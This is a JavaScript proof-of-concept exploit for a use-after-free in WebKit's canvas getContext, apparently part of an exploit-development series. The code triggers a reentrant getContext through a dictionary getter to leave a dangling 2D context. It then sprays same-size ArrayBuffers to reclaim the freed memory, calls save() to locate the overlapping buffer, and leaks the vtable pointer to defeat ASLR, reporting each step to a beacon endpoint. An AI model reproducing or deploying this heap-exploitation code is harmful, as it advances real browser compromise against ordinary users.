// p481 — Canvas UAF with CORRECT dangling pointer usage
//
// CRITICAL FIX from p470: innerCtx is the DANGLING pointer, not outerCtx.
//
// WK-1400 source trace (HTMLCanvasElement.cpp):
//   1. Outer getContext('2d', evilDict) enters
//   2. Line 226: m_context = null → falls through
//   3. Line 268: convert<IDLDictionary>() processes evilDict → alpha getter fires
//   4. Getter: inner getContext('2d') → createContext2d() → m_context = C1 → returns C1
//   5. Outer resumes → line 271: createContext2d() → m_context = C2 (C1 FREED by unique_ptr)
//   6. innerCtx = C1 (FREED), outerCtx = C2 (LIVE)
//
// Context2D layout (~712 bytes → 768B FastMalloc size class):
//   +0:   vtable pointer (8 bytes) — ASLR leak target
//   +32:  m_canvas (RefPtr, 8 bytes) — MUST BE ZERO for GC safety
//   +112: m_stateStack.m_buffer (Vector ptr, 8 bytes)
//   +592: m_unrealizedSaveCount (unsigned, 4 bytes) — save() marker
//
// Strategy:
//   1. Trigger reentrant getContext() → innerCtx=C1(freed), outerCtx=C2(live)
//   2. Spray 768-byte ABs (zeroed at +32) to fill C1's freed slot
//   3. Call innerCtx.save() → increments m_unrealizedSaveCount at +592 in AB
//   4. Scan ABs for non-zero at offset 592 → identifies overlapping AB
//   5. Read vtable at +0 → ASLR leak
//
// Beacon prefix: V481-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V481-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hx(b) { return (b < 16 ? '0' : '') + b.toString(16); }
  function hexN(view, off, n) {
    var s = '';
    for (var i = 0; i < n && off + i < view.length; i++) s += hx(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: Trigger reentrant getContext → aliased contexts
  // innerCtx = C1 (will be FREED), outerCtx = C2 (LIVE)
  // ═══════════════════════════════════════════════════════════
  var danglingCtx = null;  // innerCtx = C1 = DANGLING after outer completes
  var liveCtx = null;      // outerCtx = C2 = LIVE
  var triggerCanvas = null;

  try {
    triggerCanvas = document.createElement('canvas');
    triggerCanvas.width = 100;
    triggerCanvas.height = 100;
    document.body.appendChild(triggerCanvas);

    var callCount = 0;
    var evilDict = {};
    // WK-1400 IDL: alpha is COMMENTED OUT, only desynchronized + colorSpace exist
    Object.defineProperty(evilDict, 'desynchronized', {
      get: function() {
        callCount++;
        if (callCount === 1) {
          danglingCtx = triggerCanvas.getContext('2d');
          B('INNER-C1', danglingCtx ? 'GOT' : 'NULL');
        }
        return false;
      }
    });

    liveCtx = triggerCanvas.getContext('2d', evilDict);
    B('OUTER-C2', liveCtx ? 'GOT' : 'NULL');
    B('ALIAS', (danglingCtx && liveCtx && danglingCtx !== liveCtx) ? 'YES' : 'NO');
    B('CALLS', '' + callCount);

    if (!danglingCtx || !liveCtx || danglingCtx === liveCtx) {
      B('ABORT', 'no-alias:dangling=' + !!danglingCtx + ',live=' + !!liveCtx + ',same=' + (danglingCtx === liveCtx));
      return;
    }
  } catch(e) {
    B('ERR-ALIAS', e.message);
    return;
  }

  // C1 is already FREED at this point (unique_ptr replaced it with C2).
  // C1's memory is in the FastMalloc freelist for the 768-byte size class.
  // danglingCtx's JS wrapper still holds a pointer to C1's freed memory.

  // ═══════════════════════════════════════════════════════════
  // PHASE 2: Spray 768-byte ABs to fill C1's freed slot
  // Keep spray count LOW to avoid triggering GC (which would crash
  // via visitAdditionalChildren reading m_canvas at +32)
  // ═══════════════════════════════════════════════════════════
  var AB_SIZE = 768;
  var N_SPRAY = 30;       // Low count: 30 × 768B = ~23KB, well under GC eden
  var MCANVAS_OFF = 32;   // m_canvas RefPtr — MUST stay zero for GC safety
  var SAVE_OFF = 592;     // m_unrealizedSaveCount
  var MARKER = 0x41;      // 'A' fill for identification

  var sprayABs = [];
  var sprayViews = [];

  for (var i = 0; i < N_SPRAY; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var v = new Uint8Array(ab);
    // Fill with marker pattern
    for (var j = 0; j < AB_SIZE; j++) v[j] = MARKER;
    // CRITICAL: zero offset 32-39 (m_canvas RefPtr) so GC doesn't crash
    for (var j = MCANVAS_OFF; j < MCANVAS_OFF + 8; j++) v[j] = 0;
    // Zero offset 592-595 (m_unrealizedSaveCount) so we detect increment
    for (var j = SAVE_OFF; j < SAVE_OFF + 4; j++) v[j] = 0;
    sprayABs.push(ab);
    sprayViews.push(v);
  }
  B('SPRAY', N_SPRAY + 'x' + AB_SIZE);

  // ═══════════════════════════════════════════════════════════
  // PHASE 3: Use save() via danglingCtx (C1, freed → AB reclaimed)
  // save() increments m_unrealizedSaveCount at +592
  // This is a simple ++uint, no pointer dereference needed
  // ═══════════════════════════════════════════════════════════
  try {
    B('SAVE-START');
    danglingCtx.save();
    B('SAVE-1', 'OK');
    danglingCtx.save();
    B('SAVE-2', 'OK');
    danglingCtx.save();
    B('SAVE-3', 'OK');
  } catch(e) {
    B('SAVE-ERR', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 4: Scan ABs for save() marker at offset 592
  // 3 save() calls → m_unrealizedSaveCount should be 3
  // ═══════════════════════════════════════════════════════════
  B('SCAN-START');
  var hitIdx = -1;
  var hitVal = 0;

  for (var i = 0; i < sprayViews.length; i++) {
    var v = sprayViews[i];
    var val = u32(v, SAVE_OFF);
    if (val !== 0) {
      hitIdx = i;
      hitVal = val;
      B('HIT-' + i, 'saveCount=' + val);

      // Dump key offsets from the overlapping AB
      B('VTABLE-' + i, hexN(v, 0, 8));         // vtable at +0 → ASLR leak!
      B('MCANVAS-' + i, hexN(v, 32, 8));       // m_canvas at +32 (should be 0)
      B('STATESTACK-' + i, hexN(v, 112, 8));   // m_stateStack.m_buffer at +112
      B('SAVECOUNT-' + i, hexN(v, 592, 4));     // m_unrealizedSaveCount at +592

      // Dump wider region around save count
      B('REGION-' + i, hexN(v, 580, 32));

      // Dump first 64 bytes (vtable + early fields)
      B('HEAD-' + i, hexN(v, 0, 64));

      // Only report first hit
      break;
    }
  }

  if (hitIdx >= 0) {
    B('SUMMARY', 'HIT-idx=' + hitIdx + ',saveCount=' + hitVal + ',total=' + N_SPRAY);

    // ASLR leak: vtable pointer at offset 0
    var vtLeak = hexN(sprayViews[hitIdx], 0, 8);
    B('VTABLE-LEAK', vtLeak);

    // Try lineWidth read via dangling ctx
    // This reads from stateStack which may point into our AB
    try {
      var lw = danglingCtx.lineWidth;
      B('LINEWIDTH', '' + lw);
    } catch(e) {
      B('LINEWIDTH-ERR', e.message);
    }

    // Try reading globalAlpha — another state property
    try {
      var ga = danglingCtx.globalAlpha;
      B('GLOBALALPHA', '' + ga);
    } catch(e) {
      B('GLOBALALPHA-ERR', e.message);
    }
  } else {
    B('NO-HIT', 'saveCount=0 in all ' + N_SPRAY + ' ABs');

    // Check if any AB was modified at ALL (not just at saveCount offset)
    var anyDirty = 0;
    for (var i = 0; i < sprayViews.length; i++) {
      var v = sprayViews[i];
      for (var j = 0; j < AB_SIZE; j++) {
        if (j >= MCANVAS_OFF && j < MCANVAS_OFF + 8) continue;
        if (j >= SAVE_OFF && j < SAVE_OFF + 4) continue;
        if (v[j] !== MARKER) { anyDirty++; break; }
      }
    }
    B('DIRTY-ABS', '' + anyDirty);

    // Dump first AB header to see if vtable was written (even if saveCount=0)
    B('AB0-HEAD', hexN(sprayViews[0], 0, 16));
    B('AB0-SAVE', hexN(sprayViews[0], 592, 4));
  }

  B('DONE');
})();
